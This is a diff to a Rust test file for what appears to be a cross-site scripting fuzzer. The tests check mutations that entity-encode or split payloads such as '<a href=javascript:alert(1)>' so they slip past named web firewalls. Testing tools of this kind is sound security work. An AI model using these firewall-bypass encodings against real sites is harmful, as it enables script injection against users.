@@ -534,6 +534,10 @@ const ALL_MUTATIONS: &[MutationType] = &[
     MutationType::HtmlEntityParens,
     MutationType::SvgAnimateExec,
     MutationType::ExoticWhitespace,
+    MutationType::KeywordEntityEncode,
+    MutationType::MultiSlash,
+    MutationType::SchemeBreak,
+    MutationType::EntityScheme,
 ];
 
 #[test]
@@ -550,13 +554,40 @@ fn display_renders_every_mutation_type() {
 
 #[test]
 fn apply_single_mutation_dispatches_and_transforms_every_type() {
-    // A payload that triggers every mutation (HTML tag + attr break + sink
-    // call + parens) so each dispatch arm runs its real transform, not the
-    // no-op fallthrough.
-    let payload = "<svg onload=alert(1)>";
-    for m in ALL_MUTATIONS {
+    // Each mutation paired with a payload shaped to trigger it, so every
+    // dispatch arm runs its real transform (not the no-op fallthrough). The
+    // attribute-decode-layer mutations need their own shapes: MultiSlash needs
+    // two separators, SchemeBreak/EntityScheme need a `javascript:` scheme in
+    // an attribute, none of which the lone `<svg onload=alert(1)>` carries.
+    let cases: &[(MutationType, &str)] = &[
+        (MutationType::HtmlCommentSplit, "<svg onload=alert(1)>"),
+        (MutationType::WhitespaceMutation, "<svg onload=alert(1)>"),
+        (MutationType::JsCommentSplit, "<svg onload=alert(1)>"),
+        (MutationType::BacktickParens, "<svg onload=alert(1)>"),
+        (MutationType::ConstructorChain, "<svg onload=alert(1)>"),
+        (MutationType::UnicodeJsEscape, "<svg onload=alert(1)>"),
+        (MutationType::MixedHtmlEntities, "<svg onload=alert(1)>"),
+        (MutationType::CaseAlternation, "<svg onload=alert(1)>"),
+        (MutationType::SlashSeparator, "<svg onload=alert(1)>"),
+        (MutationType::HtmlEntityParens, "<svg onload=alert(1)>"),
+        (MutationType::SvgAnimateExec, "<svg onload=alert(1)>"),
+        (MutationType::ExoticWhitespace, "<svg onload=alert(1)>"),
+        (MutationType::KeywordEntityEncode, "<svg onload=alert(1)>"),
+        (MutationType::MultiSlash, "<img src=x onerror=alert(1)>"),
+        (MutationType::SchemeBreak, "<a href=javascript:alert(1)>"),
+        (MutationType::EntityScheme, "<a href=javascript:alert(1)>"),
+    ];
+    for (m, payload) in cases {
         let out = apply_single_mutation(payload, m);
-        assert_ne!(out, payload, "{:?} should transform the trigger payload", m);
+        assert_ne!(&out, payload, "{:?} should transform {}", m, payload);
+    }
+    // The case table must cover every variant exercised elsewhere.
+    for m in ALL_MUTATIONS {
+        assert!(
+            cases.iter().any(|(cm, _)| cm == m),
+            "missing transform case for {:?}",
+            m
+        );
     }
 }
 
@@ -608,4 +639,217 @@ fn svg_animate_exec_transforms_uppercase_img_onerror() {
     let out = svg_animate_exec("<IMG SRC=x ONERROR=alert(1)>");
     assert!(out.starts_with("<svg><animate onbegin=alert(1)"));
     assert!(out.contains("dur=1s"));
+}
+
+// ── KeywordEntityEncode (M3) ────────────────────────────────────────
+
+#[test]
+fn keyword_entity_encode_fires_in_event_handler() {
+    // The sink's first letter is entity-encoded; the HTML tokenizer decodes
+    // `&#97;` to `a` in the attribute value before the handler is compiled.
+    assert_eq!(
+        keyword_entity_encode("<img src=x onerror=alert(1)>"),
+        "<img src=x onerror=&#97;lert(1)>"
+    );
+    assert_eq!(
+        keyword_entity_encode("<svg onload=confirm(1)>"),
+        "<svg onload=&#99;onfirm(1)>"
+    );
+}
+
+#[test]
+fn keyword_entity_encode_fires_in_javascript_url() {
+    // A `javascript:` URL value is also entity-decoded before JS compilation.
+    assert_eq!(
+        keyword_entity_encode("<a href=javascript:alert(1)>"),
+        "<a href=javascript:&#97;lert(1)>"
+    );
+    // Bare scheme payload (dalfox emits these for URL-sink reflection).
+    assert_eq!(
+        keyword_entity_encode("javascript:prompt(1)"),
+        "javascript:&#112;rompt(1)"
+    );
+}
+
+#[test]
+fn keyword_entity_encode_noops_inside_script_rawtext() {
+    // CRITICAL: <script> raw text is NOT entity-decoded — encoding here would
+    // emit a non-executing SyntaxError variant, so it must no-op. The common
+    // breakout shape `"><script>…` must still be recognized as raw text.
+    assert_eq!(
+        keyword_entity_encode("<script>alert(1)</script>"),
+        "<script>alert(1)</script>"
+    );
+    assert_eq!(
+        keyword_entity_encode("\"><script>alert(1)</script>"),
+        "\"><script>alert(1)</script>"
+    );
+}
+
+#[test]
+fn keyword_entity_encode_noops_without_attr_context_or_sink() {
+    // A sink call that is neither in a handler nor a javascript: URL must
+    // no-op (no entity decode would happen there).
+    assert_eq!(keyword_entity_encode("alert(1)"), "alert(1)");
+    // No known sink call at all.
+    assert_eq!(
+        keyword_entity_encode("<svg onload=foo(1)>"),
+        "<svg onload=foo(1)>"
+    );
+}
+
+#[test]
+fn keyword_entity_encode_not_fooled_by_literal_script_in_attribute() {
+    // Regression: a literal `<script` substring inside another tag's quoted
+    // attribute value (closed by the attribute quote) must NOT be mistaken for
+    // a raw-text region, so the handler sink still gets mutated. (Found by the
+    // adversarial implementation review.)
+    assert_eq!(
+        keyword_entity_encode("<script></script><img alt=\"<script\" onclick=\"alert(1)\">"),
+        "<script></script><img alt=\"<script\" onclick=\"&#97;lert(1)\">"
+    );
+}
+
+// ── MultiSlash (M4) ─────────────────────────────────────────────────
+
+#[test]
+fn multi_slash_replaces_every_top_level_separator() {
+    assert_eq!(
+        multi_slash("<img src=x onerror=alert(1)>"),
+        "<img/src=x/onerror=alert(1)>"
+    );
+}
+
+#[test]
+fn multi_slash_noops_on_single_separator() {
+    // One separator → identical to slash_separator's output, which the dedup
+    // seen-set would drop; no-op so it never claims a variant slot.
+    assert_eq!(
+        multi_slash("<svg onload=alert(1)>"),
+        "<svg onload=alert(1)>"
+    );
+}
+
+#[test]
+fn multi_slash_preserves_quoted_attribute_whitespace() {
+    // Whitespace inside a quoted value must NOT become a slash.
+    assert_eq!(
+        multi_slash("<img src=x onerror=\"a = b\">"),
+        "<img/src=x/onerror=\"a = b\">"
+    );
+}
+
+#[test]
+fn multi_slash_noops_without_an_opening_tag() {
+    assert_eq!(multi_slash("alert(1)"), "alert(1)");
+    // A closing tag is not an opening tag.
+    assert_eq!(multi_slash("</div>"), "</div>");
+}
+
+#[test]
+fn multi_slash_leaves_trailing_self_close_alone() {
+    // The space before a trailing `/>` is not followed by an attr letter, so it
+    // is not a separator → single real separator → no-op.
+    assert_eq!(
+        multi_slash("<svg onload=alert(1) />"),
+        "<svg onload=alert(1) />"
+    );
+}
+
+// ── SchemeBreak (M1) ────────────────────────────────────────────────
+
+#[test]
+fn scheme_break_splits_scheme_in_attribute() {
+    assert_eq!(
+        scheme_break("<a href=javascript:alert(1)>"),
+        "<a href=java&#9;script:alert(1)>"
+    );
+    // Quoted attribute value.
+    assert_eq!(
+        scheme_break("<iframe src=\"javascript:alert(1)\">"),
+        "<iframe src=\"java&#9;script:alert(1)\">"
+    );
+}
+
+#[test]
+fn scheme_break_splits_bare_scheme_payload() {
+    assert_eq!(
+        scheme_break("javascript:alert(1)"),
+        "java&#9;script:alert(1)"
+    );
+    // vbscript keyword splits too.
+    assert_eq!(scheme_break("vbscript:msgbox(1)"), "vbsc&#9;ript:msgbox(1)");
+}
+
+#[test]
+fn scheme_break_noops_outside_executable_context() {
+    // Mid-body-text scheme: no attribute decode happens, so no-op.
+    assert_eq!(
+        scheme_break("<div>see javascript:alert(1)</div>"),
+        "<div>see javascript:alert(1)</div>"
+    );
+    // No scheme at all.
+    assert_eq!(
+        scheme_break("<img src=x onerror=alert(1)>"),
+        "<img src=x onerror=alert(1)>"
+    );
+    // Scheme inside <script> raw text.
+    assert_eq!(
+        scheme_break("<script>x='javascript:alert(1)'</script>"),
+        "<script>x='javascript:alert(1)'</script>"
+    );
+}
+
+// ── EntityScheme (companion to M1) ──────────────────────────────────
+
+#[test]
+fn entity_scheme_encodes_leading_scheme_letter() {
+    assert_eq!(
+        entity_scheme("<a href=javascript:alert(1)>"),
+        "<a href=&#106;avascript:alert(1)>"
+    );
+    assert_eq!(
+        entity_scheme("javascript:alert(1)"),
+        "&#106;avascript:alert(1)"
+    );
+}
+
+#[test]
+fn entity_scheme_noops_outside_executable_context() {
+    assert_eq!(
+        entity_scheme("<div>javascript:alert(1) is text</div>"),
+        "<div>javascript:alert(1) is text</div>"
+    );
+    assert_eq!(
+        entity_scheme("<svg onload=alert(1)>"),
+        "<svg onload=alert(1)>"
+    );
+}
+
+// ── Strategy wiring ─────────────────────────────────────────────────
+
+#[test]
+fn keyword_entity_encode_wired_into_keyword_wafs() {
+    for waf in [
+        WafType::Cloudflare,
+        WafType::OwaspCrs,
+        WafType::ModSecurity,
+        WafType::Citrix,
+    ] {
+        assert!(
+            get_bypass_strategy(&waf)
+                .mutations
+                .contains(&MutationType::KeywordEntityEncode),
+            "{:?} should exercise KeywordEntityEncode",
+            waf
+        );
+    }
+}
+
+#[test]
+fn scheme_and_multislash_wired_into_regex_wafs() {
+    let crs = get_bypass_strategy(&WafType::OwaspCrs).mutations;
+    assert!(crs.contains(&MutationType::MultiSlash));
+    assert!(crs.contains(&MutationType::SchemeBreak));
+    assert!(crs.contains(&MutationType::EntityScheme));
 }
